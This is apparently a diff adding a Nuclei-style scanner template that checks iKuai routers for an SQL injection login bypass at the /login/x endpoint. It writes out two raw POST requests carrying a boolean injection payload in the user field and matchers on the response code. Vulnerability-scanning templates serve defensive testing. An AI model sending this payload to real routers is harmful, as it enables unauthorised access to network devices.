@@ -1,0 +1,43 @@
+id: ikuai-login-x-sqli-bypass
+info:
+  name: iKuai /login/x SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    iKuai routers are vulnerable to an SQL injection vulnerability at the /login/x endpoint, allowing attackers to bypass login authentication.
+
+http:
+  - raw:
+      - |
+        POST /login/x HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user=%22+or+1%3d0+or+%22%22%3d%22&pass=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - '"recode"\s*:\s*"1"'
+
+  - raw:
+      - |
+        POST /login/x HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user=%22+or+1%3d1+or+%22%22%3d%22&pass=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - '"recode"\s*:\s*"0"'
